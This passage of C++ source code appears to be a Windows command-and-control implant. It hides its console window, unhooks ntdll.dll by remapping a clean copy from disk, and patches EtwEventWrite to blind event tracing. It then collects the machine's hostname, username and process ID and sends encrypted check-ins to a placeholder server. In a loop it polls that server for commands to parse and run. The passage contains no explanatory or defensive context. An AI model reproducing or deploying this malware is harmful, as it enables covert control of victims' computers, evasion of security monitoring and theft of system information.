    HINTERNET hRequest = HttpOpenRequestA(hConnection, "POST", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 1);
    if (HttpSendRequestA(hRequest, headers, strlen(headers), response, responseStr.length())) {
        DWORD blocksize = 4096;
        DWORD received = 0;
        std::string block(blocksize, 0);
        while (InternetReadFile(hRequest, &block[0], blocksize, &received)
            && received)
        {
            block.resize(received);
            result += block;
        }
    }


    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);


    std::string allowed_f = decryptStr(result);
   
    split(allowed_f, allowed, '#');
   


    
}

char* GetMachineInfo(struct Info& infostruct)
{
    TCHAR buffer[256] = TEXT("");
    TCHAR szDescription[8][32] = { TEXT("NetBIOS"),
        TEXT("DNS hostname"),
        TEXT("DNS domain"),
        TEXT("DNS fully-qualified"),
        TEXT("Physical NetBIOS"),
        TEXT("Physical DNS hostname"),
        TEXT("Physical DNS domain"),
        TEXT("Physical DNS fully-qualified") };
    int cnf = 0;
    DWORD dwSize = _countof(buffer);

    TCHAR username[MAX_PATH] = TEXT("");
    TCHAR processname[MAX_PATH] = TEXT("");
    DWORD nSize = MAX_PATH;

    GetUserName(username, &nSize);
    DWORD dwPid = GetCurrentProcessId();
    GetModuleFileNameW(NULL, processname, nSize);

    for (cnf = 0; cnf < ComputerNameMax; cnf++)
    {
        if (!GetComputerNameEx((COMPUTER_NAME_FORMAT)cnf, buffer, &dwSize))
        {
            _tprintf(TEXT("GetComputerNameEx failed (%d)\n"), GetLastError());
            return NULL;
        }
        else {
            if (cnf == 3) {
                std::wstring s1(&buffer[0]);
                std::string s2(s1.begin(), s1.end());
                infostruct.Hostname = s2;
            }

        }


        dwSize = _countof(buffer);
        ZeroMemory(buffer, dwSize);
    }

    std::wstring s1(&username[0]);
    std::string s2(s1.begin(), s1.end());

    infostruct.Username = s2;
    
    infostruct.PID = dwPid;



    char* data = (char*)malloc(MAX_PATH * 5);

    if (!data)
    {
        return NULL;
    }

    sprintf(data,
        "{ \"init\": {\"hostname\": \"%s\", \"username\": \"%s\", \"dwpid\": \"%ld\"}}",
        infostruct.Hostname, infostruct.Username, dwPid);

    return data;

}

void check_in() {
    std::string encMessage = encryptStr(INFOSTR);
    std::string result;
    std::string url;

    url = "/_189129";
    std::string responseStr = encryptStr("alive");
    responseStr = responseStr + "#" + encryptStr(TOKENBOT) + "#" + encMessage;
    //cout << "checkin string: " << responseStr << endl;
    LPVOID response = (LPVOID)(responseStr.c_str());
    const char* headers = "Content-Type: text/plain\r\nHost: PUT HOST\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";
    //const char* headers = "Content-Type: application/json\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";
    //LPVOID myMessage = (LPVOID)postData.c_str();
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnection = InternetConnectA(hInternet, "PUT HOST", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
    //HINTERNET hConnection = InternetConnectA(hInternet, "api.telegram.org", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
    HINTERNET hRequest = HttpOpenRequestA(hConnection, "POST", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 1);
    if (HttpSendRequestA(hRequest, headers, strlen(headers), response, responseStr.length())) {
        DWORD blocksize = 4096;
        DWORD received = 0;
        std::string block(blocksize, 0);
        while (InternetReadFile(hRequest, &block[0], blocksize, &received)
            && received)
        {
            block.resize(received);
            result += block;
        }
    }

    //cout << "Result do checking: " << result << endl;
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);


    
    
}


int main() {

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };
    unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
    unsigned int sNtdllPath_len = sizeof(sNtdllPath);
    unsigned int sNtdll_len = sizeof(sNtdll);
    int ret = 0;
    //HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID pMapping;

    //ret = UnhookNtdll(GetModuleHandle((LPCSTR)sNtdll), pMapping);
    unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
    unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
    unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
    unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };

    CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)sCreateFileMappingA);
    //printf("CreateMaping: 0x%p\n", CreateFileMappingA_p);
    MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)sMapViewOfFile);
    //printf("Maping: 0x%p\n", MapViewOfFile_p);

    UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)sUnmapViewOfFile);
    //printf("Maping: 0x%p\n", UnmapViewOfFile_p);
    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)sVirtualProtect);
    //printf("Virtualprotect: 0x%p\n", VirtualProtect_p);

    HANDLE hSection = NULL, hFile = NULL;


    //XORcrypt((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
    hFile = CreateFile(TEXT("C:\\Windows\\System32\\ntdll.dll"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // failed to open ntdll.dll
        printf("Erro: CreateFile");
        return -1;
    }

    // prepare file mapping
    hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        // file mapping failed
        printf("Erro: Maping");
        CloseHandle(hFile);
        return -1;
    }

    // map the bastard
    pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        // mapping failed
        printf("Erro: Mapinview");
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return -1;
    }

    // remove hooks
    ret = UnhookNtdll(GetModuleHandle(TEXT("ntdll.dll")), pMapping);

    // Clean up.
    UnmapViewOfFile_p(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);

    //


    //Disable etw
    DWORD oldprotect = 0;

    unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

    void* pEventWrite = GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), (LPCSTR)sEtwEventWrite);
   

    VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

    memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret


    VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);
    //	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));

    FileSystem* fs;

    fs = new FileSystem();

    struct Info infostruct;
    globalInfo = &infostruct;
  
    bool scs;

    scs = start();

    while (!scs) {
        scs = start();
        Delay_Exec(5000);
    }
   
    zeroUpdates();
    INFOSTR = GetMachineInfo(infostruct);
    

    getAllowed();
    sayHello(infostruct);
    int alive_counter = 0;


    while (1) {
        if (alive_counter >= 3) {
            alive_counter = 0;
            check_in();
        }
        Delay_Exec(3000);
        
        vector<struct Update> update = getStruct(fs);
 
        for (int i = 0; i < update.size(); i++) {
            parse(update[i], fs);
        }

        alive_counter++;
     
    }
}